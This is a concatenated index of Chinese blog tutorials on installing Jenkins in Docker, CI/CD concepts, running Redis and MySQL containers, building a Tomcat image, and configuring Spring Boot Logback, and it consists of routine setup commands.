/etc/profileJAVA_HOME=/usr/local/jdk1.8.0_201JRE_HOME=/usr/local/jdk1.8.0_201/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATHMAVEN_HOME=/usr/local/apache-maven-3.6.0PATH=$PATH:$MAVEN_HOME/binexport MAVEN_HOME PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效# mvn -version# java -version# javac -version# 最后如果上面的配置都生效了，建议执行commit操作生成Docker备份镜像# docker commit -a "clay@gmail.com" -m "commit jenkins-server image" tomcat8 clay/jenkins-server:1.1 Tomcat 容器内安装 Jenkins Jenkins 本质是一个 Java 开发的 Web 项目，官方发布方式有 War 文件、Native 包、安装程序、Docker 镜像，Jenkins 官方下载页面。 12345678910111213141516171819202122232425# 连接容器# docker exec -it tomcat8 /bin/bash# 下载War文件到Tomcat的webapps目录# wget -P /usr/local/tomcat/webapps https://mirrors.tuna.tsinghua.edu.cn/jenkins/war-stable/2.150.2/jenkins.war# 编辑server.xml配置文件，修改Tomcat URI地址的编码解码字符集为UTF-8# vim /usr/local/tomcat/conf/server.xml&lt;Connector port="8080" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" URIEncoding="UTF-8"/&gt;# 断开容器连接# exit# 重启容器# docker restart tomcat8# 浏览器访问以下地址测试Jenkins是否启动成功，首次访问Jenkins的管理页面，会提示进行解锁操作http://127.0.0.1:8888/jenkins# 如果Jenkins启动失败，可以通过输入以下地址查看Jenkins的日志信息或者查看Tomcat的日志信息来定位问题http://localhost:8888/jenkins/log/all# 提示：Jenkins默认的数据目录是：/root/.jenkins 解锁 Jenkins 12345# 连接容器# docker exec -it tomcat8 /bin/bash# 查看Jenkins自动生成的管理密码，并将管理密码填写到Jenkins的解锁页面中，这里的管理密码同时也是admin账号的登录密码# cat /root/.jenkins/secrets/initialAdminPassword 安装 Jenkins 插件 解锁后会跳转到 “自定义 Jenkins” 页面，页面中选择哪种方式来安装插件都不会对后续操作有太大影响；因为有需要的插件可以在后续有针对性地安装，本文选择 “安装推荐的插件”。 创建 Jenkins 管理员用户 根据页面提示创建管理员用户，表单填写完后点击”Save and Continue” 按钮保存设置，这里的管理员用户区别于 Jenkins 自动创建的 admin 用户。 配置 Jenkins 实例 一般使用默认的 Jenkins URL 即可。 登录 Jenkins 管理后台 浏览器输入 Jenkins 管理后台的登录地址，填写上面创建的管理员或者 admin 账号和密码即可登录。如果登录后的页面只显示空白页面，可以尝试重启 Tomcat 服务器再访问 URL：http://127.0.0.1:8888/jenkins/login Jenkins 支持中文界面 Manage Jenkins –&gt; Manage Plugins –&gt; Available –&gt; 搜索关键字”Local” –&gt; 选中 Local 插件进行安装，建议安装完之后手动重启 Tomcat 服务器。 Jenkins 开启用户注册功能 Manage Jenkins –&gt; Configure Global Security –&gt; 勾选”Allow users to sign up” –&gt; 点击”Save” 按钮保存设置。如果是处于学习或者测试阶段，还可以勾选 “Anyone can do anything”，这样更方便测试 Jenkins 的功能。出于安全考虑，生产环境下记得取消勾选此项。 Jenkins 全局工具配置 Manage Jenkins –&gt; Global Tool Configuration –&gt; 指定 Maven 的配置文件路径、JDK 的安装路径、Maven 的安装路径 –&gt; 点击”Save” 按钮保存设置。不要选择自动安装，因为上面已经手动安装并配置好 Maven、Oracle JDK。 安装 deploy to container 插件 到此为止，基于 SVN + Jenkins + Maven + JDK + Docker 的 CI/CD 环境已经搭建完成。 下篇：Jenkins 入门教程之三 Jenkins 与 SVN 持续集成实战 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Jenkins 入门教程之一 Jenkins 介绍",url:"/posts/dbce0754.html",text:'Jenkins 相关站点 Jenkins 官网 Jenkins 官方文档 官方 Jenkins Docker 镜像的使用说明文档 Jenkins 与 Hundson 介绍 Jenkins 与 Hundson 是目前最流行的持续集成及自动化部署工具，基于 Java 语言开发，二者师出同门。2009 年甲骨文收购了 Sun 公司并继承了 Hudson 代码库。在 2011 年年初，甲骨文和开源社区之间的关系破裂，该项目被分成两个独立的项目 Jenkins 和 Hundson。其中 Jenkins 的团队由大部分原始开发人员组成，Hudson 则由甲骨文公司继续管理，所以二者是非常相似的产品。Jenkins 可以整合 Subversion、Git、GitHub 等，而 Husband 同样也可以。其他优秀的持续集成工具还有 Strider、GitLab CI、TeamCity（JetBrains）、Travis CI、Codeship、Codefresh 等。 持续集成介绍 问题：各个小组分别负责各个具体模块开发，本模块独立测试虽然能够通过，但是上线前夕将所有模块整合到一起集成测试却发现存在很多问题，想要解决就需要把很多代码返工重写而且仍然有可能有问题，但现在时间很可能不够了。那怎么做会好一些呢？ 概念：Continuous Integration（CI）持续集成指开发人员提交了新代码之后，立刻进行构建、自动化测试。根据测试结果，确定所有模块的代码是否能正确地集成在一起；如果失败，开发团队就要停下手中的工作立即修复它。Martin Fowler 说过：” 持续集成并不能消除 Bug，而是让它们非常容易发现和改正。” 关注点：持续集成的关注点在于尽早发现项目整体运行存在的问题，并尽早解决。 持续交付介绍 问题：项目的各个升级版本之间间隔时间太长，对用户反馈感知迟钝，无法精确改善用户体验，用户流失严重。那怎么做会好一些呢？ 概念：Continuous Delivery (CD) 持续交付建立在持续集成的基础上，指将集成后的代码部署到更贴近真实运行环境的「类生产环境」，确保可以以可持续的方式快速向质量团队或者用户发布新版本；同时不断收集用户反馈的信息，用最快的速度改进优化。如果代码没有问题，下一步可以继续部署到生产环境中。 关注点：持续交付的关注点在于研发团队的最新代码能够尽快让最终用户体验到。 持续部署介绍 问题：开发过程中进行单元测试能够通过，但是部署到服务器上运行出现问题。仅仅单元测试还不够，各个模块都必须能够在服务器上运行。那怎么做会好一些呢？ 概念：Continuous Deployment（CD）持续部署建立在持续交付的基础上，指代码通过评审之后，把部署到生产环境的过程自动化，前提是能自动化完成构建、测试、部署等步骤。 关注点：持续部署的关注点在于代码在任何时刻都是可以部署和进入生产阶段的，为下一步测试环节或最终用户正式使用做好准备。 CI/CD 工作流程图 GitOps 工作流程图 参考资料 什么是 CI/CD？ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Docker 之十二可视化管理工具介绍",url:"/posts/91f8692e.html",text:'主流的 Docker 可视化管理工具 docker ui、shipyard、portainer var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之十一实战 Push 镜像到阿里云镜像仓库",url:"/posts/8496a43e.html",text:'设置 Registry 登录密码 创建命名空间 创建镜像仓库（本地） 将本地镜像推送到镜像仓库 123456789101112131415161718# 在下面的操作中，链接registry.cn-shenzhen.aliyuncs.com可以从阿里云的镜像仓库管理页面获取# 登录阿里云Docker Registry，成功后帐号信息默认存放在 ~/.docker/config.json# docker login --username=[用户名] registry.cn-shenzhen.aliyuncs.com# tag命令官方语法: docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]# tag命令官方解释： Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE# 创建目标镜像，其中peter-docker-study是命名空间，centos-test是仓库名称# docker tag [镜像ID] registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号]# 查看本地镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test [镜像版本号] [镜像ID] 1 hours ago 385MB# 将本地镜像Push到阿里云镜像仓库# docker push registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号] 从镜像仓库拉取镜像到本地 12345678910# 拉取镜像到本地，其中peter-docker-study是命名空间，centos-test是仓库名称# docker pull registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号]# 查看本地镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEregistry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test [镜像版本号] [镜像ID] 1 hours ago 385MB# 以交互式运行Pull下来的Docker镜像# docker run -it --name=“peter-centos” registry.cn-shenzhen.aliyuncs.com/peter-docker-study/centos-test:[镜像版本号] var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之十实战使用 Docker 官方的 Redis 镜像",url:"/posts/f13cae46.html",text:'Docker 官方 Redis 镜像的使用说明文档 https://hub.docker.com/_/redis 使用 Docker 官方的 Redis 镜像 1234567891011121314151617181920212223242526272829303132333435363738394041424344# 搜索所有可用的Redis镜像# docker search redis# 下载Docker官方提供的Redis5.0镜像（基于Debian-Stretch）# docker pull redis:5.0# 创建并启动（以后台方式）Redis容器，同时挂载Redis的数据文件目录和启用AOF# docker run -p 6379:6379 --name redis5.0 \\ -v /container/redis5.0/data:/data \\ -d redis:5.0 redis-server --appendonly yes# 或者指定Redis的配置文件目录来启动Redis容器# docker run -p 6379:6379 --name redis5.0 \\ -v /container/redis5.0/conf/redis.conf:/usr/local/etc/redis/redis.conf \\ -v /container/redis5.0/data:/data \\ -d redis:5.0 redis-server /usr/local/etc/redis/redis.conf# 注意：# 上面的/container/redis5.0/conf/redis.conf是Redis的配置文件目录（非配置文件本身），应该在此目录下预先添加Reids真正的配置文件redis.conf，然后再启动Redis容器# 如果指定Reids配置文件目录来启动Redis容器，那配置文件redis.conf里应该注释掉"bind"相关配置项# 指定Redis的配置文件目录来启动Redis容器，并添加Redis的配置文件，最终宿主机共享目录的目录结构如下：/container└── redis5.0 ├── conf │&nbsp;&nbsp; └── redis.conf │&nbsp;&nbsp; └── redis.conf └── data# 查看当前所有正在运行的容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESdbe17690112d redis:5.0 "docker-entrypoint.s…" 3 minutes ago Up 3 minutes 0.0.0.0:6379-&gt;6379/tcp redis5.0# 连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it redis5.0 /bin/bash# 在容器内，连接到Redis服务器# redis-cli -p 6379# 提示：Reids相关文件目录说明# 默认数据文件目录：/data# 默认安装目录：/usr/local/bin/# 默认日志文件：在配置文件redis.conf中指定# 默认配置文件：启动Redis容器的时候，如果不指定Redis的配置文件目录，则容器内使用默认参数启动Redis服务（即此时不存在默认的Reids配置文件） 验证 Redis 服务器是否可用 1234567891011121314# 在宿主机上，使用容器内的redis-cli工具连接到的Redis服务器# docker exec -it redis5.0 redis-cli# 或者在宿主机上，使用容器内的redis-cli工具连接到的Redis服务器，并指定Redis服务监听的端口# docker exec -it redis5.0 redis-cli -p 6379# 设置Key127.0.0.1:6379&gt; set key1 helloworld# 获取Key127.0.0.1:6379&gt; get key1# 退出Redis登录127.0.0.1:6379&gt; exit var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 缓存"},{title:"Docker 之九实战使用 Docker 官方的 MySQL 镜像",url:"/posts/8605ce00.html",text:'前言 Docker - MySQL 官方文档 拉取 MySQL 镜像12345# 搜索所有可用的MySQL镜像# docker search mysql# 拉取Docker官方提供的MySQL5.7镜像（基于Debian-Stretch）# docker pull mysql:5.7 启动 MySQL 容器Docker 启动容器1234567891011121314151617181920212223242526272829# 创建并启动（以后台方式）MySQL容器，同时挂载MySQL的数据文件目录# docker run -p 3308:3306 --name mysql5.7 \\ -v /container/mysql5.7/data:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -e TZ=Asia/Shanghai \\ -d mysql:5.7# 或者挂载MySQL的配置文件目录、数据文件目录、日志文件目录# docker run -p 3308:3306 --name mysql5.7 \\ -v /container/mysql5.7/conf:/etc/mysql/conf.d \\ -v /container/mysql5.7/data:/var/lib/mysql \\ -v /container/mysql5.7/logs:/var/log/mysql \\ -e MYSQL_ROOT_PASSWORD=123456 \\ -e TZ=Asia/Shanghai \\ -d mysql:5.7# 查看当前所有正在运行的容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7485feae5c64 mysql:5.7 "docker-entrypoint.s…" 7 seconds ago Up 5 seconds 33060/tcp, 0.0.0.0:3308-&gt;3306/tcp mysql5.7# 连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it mysql5.7 /bin/bash# MySQL相关文件目录说明：# 默认的日志文件目录：/var/log/mysql# 默认的数据文件目录：/var/lib/mysql# 默认的配置文件路径：/etc/mysql/my.cnf# 值得一提的是，默认的配置文件 /etc/mysql/my.cnf 会分别加载 /etc/mysql/conf.d 和 /etc/mysql/mysql.conf.d 目录下的自定义配置文件 参数 说明 -e TZ=Asia/Shanghai 设置系统时区 -e MYSQL_ROOT_PASSWORD=123456 设置数据库密码 Docker-Compose 启动容器 docker-compose.yml 配置文件的内容 123456789101112131415161718version: "3.5"services: mysql: image: mysql:5.7 container_name: mall-mysql privileged: false restart: always environment: TZ: \'Asia/Shanghai\' MYSQL_ROOT_PASSWORD: 123456 ports: - 3308:3306 volumes: - \'/container/mysql5.7/conf:/etc/mysql/conf.d\' - \'/container/mysql5.7/data:/var/lib/mysql\' - \'/container/mysql5.7/logs:/var/log/mysql\' command: --default-authentication-plugin=mysql_native_password 启动 MySQL 容器 12# 后台启动容器# docker-compose up -d 验证 MySQL 服务器1234567891011121314151617181920212223# 在容器内执行登录MySQL服务器的命令# docker exec -it mysql5.7 mysql -h localhost -u root -p# 创建数据库mysql&gt; create database bbs default character set utf8;# 创建表mysql&gt; create table bbs.user(id bigint(20) not null auto_increment primary key, name varchar(25) not null) engine=innodb auto_increment=3 default charset=utf8;# 插入表数据mysql&gt; insert into bbs.user(name) values("peter");# 查询表数据mysql&gt; select * from bbs.user;+----+-------+| id | name |+----+-------+| 3 | peter |+----+-------+1 row in set (0.00 sec)# 退出登录mysql&gt; exit 开启 MySQL 远程访问开启 MySQL 远程访问的权限，这里仅供演示，出于数据库安全考虑，强烈不建议开启 root 用户的远程访问权限，尤其是生产环境。 1234567891011121314# 在容器内执行登录MySQL服务器的命令# docker exec -it mysql5.7 mysql -h localhost -u root -p# 切换数据库mysql&gt; use mysql;# 用户授权mysql&gt; grant all privileges on *.* to root@\'%\' identified by "123456";# 更新授权信息mysql&gt; flush privileges;# 退出登录mysql&gt; exit 如果以后想在宿主机上或者外部通过 MySQL 客户端连接到 Docker 容器内的 MySQL 服务器，使用以下命令即可。其中 192.168.1.198 是 Docker 容器所在宿主机的 IP，3308 是宿主机的 MySQL 映射端口。 1mysql -h 192.168.1.198 -u root -P 3308 -p 完成 MySQL 授权后，如果外部依然无法连接 Docker 容器内的 MySQL 服务器，务必检查宿主机的防火墙是否开放了 MySQL 的映射端口（如上面的 3308 端口）。 备份 MySQL 数据库12# 备份MySQL所有数据库的数据# docker exec mysql5.7 sh -c \'exec mysqldump --all-databases -uroot -p"123456"\'&gt; ~/all-databases.sql 查看 MySQL 的日志信息1234567# 显示所有日志信息# docker logs mysql5.7# 跟踪显示日志信息# docker logs -f --tail 20 mysql5.7# 或者进入 MySQL 容器内的日志目录 /var/log/mysql，进一步分析日志信息 更改 MySQL 的最大连接数 参数 默认值 说明 max_connections 151 数据库的最大连接数 max_user_connections 单用户的最大连接数 临时更改生效123456789# 在容器内执行登录MySQL服务器的命令# docker exec -it mysql5.7 mysql -h localhost -u root -p# 临时更改最大连接数（重启后失效）mysql&gt; set GLOBAL max_connections=16384;mysql&gt; set GLOBAL max_user_connections=2000;# 退出登录mysql&gt; exit 永久更改生效1234567# 连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it mysql5.7 /bin/bash# 更改配置文件，在末尾添加两行内容# vim /etc/mysql/mysql.conf.d/mysqld.cnf max_connections=16384max_user_connections=2000 验证更改结果123456789# 在容器内执行登录MySQL服务器的命令# docker exec -it mysql5.7 mysql -h localhost -u root -p# 查看最大连接数mysql&gt; show variables like \'max_connections\';mysql&gt; show variables like "max_user_connections";# 退出登录mysql&gt; exit 提示 若 MySQL 的最大连接数更改后无法生效，则建议进一步更改 Linux 系统的最大打开文件描述符数，具体可以参考 这篇文章。 更改系统的镜像源若希望更改系统的镜像源，可以按照以下步骤进行操作，适用于 Debian 9（Stretch）。 123456789101112# 连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it mysql5.7 /bin/bash# 使用阿里云镜像站# cp /etc/apt/sources.list /etc/apt/backup.sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian-security stretch/updates main" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.list# echo "deb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib" &gt;&gt; /etc/apt/sources.list# 更新软件索引# apt-get update var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之八实战构建 Tomcat 服务器的 Docker 镜像",url:"/posts/79ba4cd.html",text:'实战内容介绍 编写 Dockerfile 文件，指定终端登录后的默认路径，安装 vim、ifconfig、jdk、tomcat，并配置 jdk 与 tomcat 的环境变量，最后通过 Dockerfile 文件构建新的 Docker 镜像（基于 Centos）并运行。 目录结构介绍 123456# 后续所有操作都在/root/build-tomcat目录下进行# tree /root/build-tomcat/root/build-tomcat├── apache-tomcat-7.0.77.tar.gz├── dockerfile-tomcat└── jdk1.8.0_201.tar.gz 编写 Dockerfile 文件 1234567891011121314151617181920212223242526272829FROM centosMAINTAINER peter&lt;peter@gmail.com&gt;ADD apache-tomcat-7.0.77.tar.gz /usr/localADD jdk1.8.0_201.tar.gz /usr/localRUN yum -y updateRUN yum -y install vim net-toolsENV work_path /usr/localWORKDIR $work_path# JavaENV JAVA_HOME /usr/local/jdk1.8.0_201ENV JRE_HOME /usr/local/jdk1.8.0_201/jreENV CLASSPATH .:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib# TomcatENV CATALINA_HOME /usr/local/apache-tomcat-7.0.77ENV CATALINA_BASE /usr/local/apache-tomcat-7.0.77ENV PATH $PATH:$JAVA_HOME/bin:$JRE_HOME/bin:$CATALINA_HOME/binEXPOSE 8080# ENTRYPOINT ["/usr/local/apache-tomcat-7.0.77/bin/startup.sh"]# CMD ["/usr/local/apache-tomcat-7.0.77/bin/catalina.sh", "run"]CMD /usr/local/apache-tomcat-7.0.77/bin/startup.sh &amp;&amp; tail -f /usr/local/apache-tomcat-7.0.77/logs/catalina.out 构建新的 Docker 镜像 1234567891011# 下载Centos最新的Docker镜像# docker pull centos# 进入构建目录# cd /root/build-tomcat# 创建Dockerfile文件，并写入上述的配置内容# vi dockerfile-tomcat# 通过Dockerfile文件构建新的Docker镜像# docker build -f dockerfile-tomcat -t peter/tomcat:7.0 . 查看新构建的 Docker 镜像 123456789101112131415161718192021222324252627# 查看新的Docker镜像# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEpeter/tomcat 7.0 0e9595636ec9 15 minutes ago 796MBcentos latest 1e1148e4cc2c 6 weeks ago 202MB# 查看新Docker镜像的创建历史# docker history peter/tomcat:7.0IMAGE CREATED CREATED BY SIZE COMMENT0e9595636ec9 16 minutes ago /bin/sh -c #(nop) CMD ["/bin/sh" "-c" "/usr… 0Bb479edef4230 16 minutes ago /bin/sh -c #(nop) EXPOSE 8080 0Ba20730382df2 16 minutes ago /bin/sh -c #(nop) ENV PATH=/usr/local/sbin:… 0Ba5513cfc5ca9 16 minutes ago /bin/sh -c #(nop) ENV CATALINA_BASE=/usr/lo… 0Bb7be0dfd36f8 16 minutes ago /bin/sh -c #(nop) ENV CATALINA_HOME=/usr/lo… 0Be3a04651ecc3 16 minutes ago /bin/sh -c #(nop) ENV CLASSPATH=.:/usr/loca… 0B7175d3dc0385 16 minutes ago /bin/sh -c #(nop) ENV JRE_HOME=/usr/local/j… 0B216b322375a3 16 minutes ago /bin/sh -c #(nop) ENV JAVA_HOME=/usr/local/… 0B238817a0fa1a 16 minutes ago /bin/sh -c #(nop) WORKDIR /usr/local 0Bd94ddbd8b1c1 16 minutes ago /bin/sh -c #(nop) ENV work_path=/usr/local 0B47d23f3fc6e9 16 minutes ago /bin/sh -c yum -y install vim net-tools 79.5MB6b892d38a8ae 17 minutes ago /bin/sh -c yum -y update 104MBd1e7e6381726 18 minutes ago /bin/sh -c #(nop) ADD file:21b3872f37d37a6dd… 397MB6efc79b6ed8b 18 minutes ago /bin/sh -c #(nop) ADD file:0581062dfa97146fd… 13.7MBb3cd54bdd2ca 18 minutes ago /bin/sh -c #(nop) MAINTAINER peter&lt;peter@gm… 0B1e1148e4cc2c 6 weeks ago /bin/sh -c #(nop) CMD ["/bin/bash"] 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) LABEL org.label-schema.sc… 0B&lt;missing&gt; 6 weeks ago /bin/sh -c #(nop) ADD file:6f877549795f4798a… 202MB 以交互式运行新构建的 Docker 镜像 12345678910111213141516# 以交互式运行新的Docker镜像，指定数据卷、端口映射、容器名称，终端会输出Tomcat启动的日志信息# docker run -it -v /container/apache-tomcat-7.0.77/logs:/usr/local/apache-tomcat-7.0.77/logs -p 8888:8080 --name="tomcat7.0-front" peter/tomcat:7.0# 退出终端（不停止容器）# ctrl + p + q# 查看当前所有正在运行的Docker容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESc9544cf44667 peter/tomcat:7.0 "/bin/sh -c \'/usr/lo…" 7 seconds ago Up 5 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat7.0-front# 重新连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it tomcat7.0-front /bin/bash# 可以使用以下命令直接检测容器内安装的JDK版本，以此判断JDK是否安装成功# docker exec tomcat7.0-daemon java -version 以后台方式运行新构建的 Docker 镜像 12345678910111213# 以后台方式运行新的Docker镜像，指定数据卷、端口映射、容器名称# docker run -d -v /container/apache-tomcat-7.0.77/logs:/usr/local/apache-tomcat-7.0.77/logs -p 8888:8080 --name="tomcat7.0-daemon" peter/tomcat:7.0# 查看当前所有正在运行的Docker容器# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES3add0356f6a1 peter/tomcat:7.0 "/bin/sh -c \'/usr/lo…" 5 seconds ago Up 3 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat7.0-daemon# 重新连接到Docker容器，连接之后如果想断开连接，在容器内的终端直接执行"exit"命令即可，连接断开后容器不会停止运行# docker exec -it tomcat7.0-daemon /bin/bash# 可以使用以下命令直接检测容器内安装的JDK版本，以此判断JDK是否安装成功# docker exec tomcat7.0-daemon java -version var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化 web服务器"},{title:"SpringBoot 整合 Logback 日志框架",url:"/posts/5233fd9d.html",text:'前言 目前比较流行的日志框架有 Log4j、Logback 等，这两个框架的作者是同一个人，Logback 旨在作为流行的 Log4j 项目的后续版本，从而恢复 Log4j 离开的位置。另外&nbsp;SLF4J (Simple Logging Facade for Java)&nbsp;则是一个日志门面框架，提供了日志系统中常用的接口，Logback 和 Log4j 则对 SLF4J 进行了实现。本文将讲述如何在 Spring Boot 中应用 SLF4J + Logback 实现日志的记录。 引入依赖 Spring Boot 默认内置了 Logback 日志框架，一般只需在 Maven 中要引入 spring-boot-starter-logging 依赖。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;&lt;/dependency&gt; 但是在实际开发中不需要直接添加 spring-boot-starter-logging 依赖，因为 spring-boot-starter 其中已经包含了 spring-boot-starter-logging，该依赖的内容就是 Spring Boot 默认支持的日志框架 SLF4J + Logback。而 spring-boot-starter-web 又包含了 spring-boot-starter，所以只需要引入 Spring Boot 的 Web 组件即可。 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; 由于 Spring Cloud 是依赖 Spring Boot 的，因此上述 Maven 配置同样适用于 Spring Cloud 项目。 默认配置 默认情况下 Spring Boot 会将日志输出到控制台，但不会写到日志文件里。如果要写入到除控制台输出之外的日志文件中，则需在 application.properties 中设置 logging.file 或 logging.path 属性。 123456# 二者不能同时使用，若同时使用，则只有logging.file生效logging.file=文件名logging.path=日志文件路径logging.level.包名=指定包下的日志级别logging.pattern.console=日志打印规则 logging.file：设置文件，可以是绝对路径，也可以是相对路径，如：logging.file=blog.log logging.path：设置目录，会在该目录下创建 spring.log 文件，并写入日志内容，如：logging.path=/tmp/log 可以看到上述这种方式配置比较简单，但是能实现的功能也非常有限，如果想要更复杂的需求，就需要下面的 logback-spring.xml 定制化配置了。 logback-spring.xml 配置详解 Spring Boot 官方推荐使用的 XML 配置文件的名称为：logback-spring.xml，而不是 logback.xml，这是因为带 -spring 后缀的文件名可以使用 &lt;springProfile&gt; 这个标签，即在 src/main/resources 下创建 logback-spring.xml 文件。也可以使用自定义的文件名称，比如 logback-config.xml，此时只需要在 application.properties 文件中使用 logging.config=classpath:logback-config.xml 指定即可。 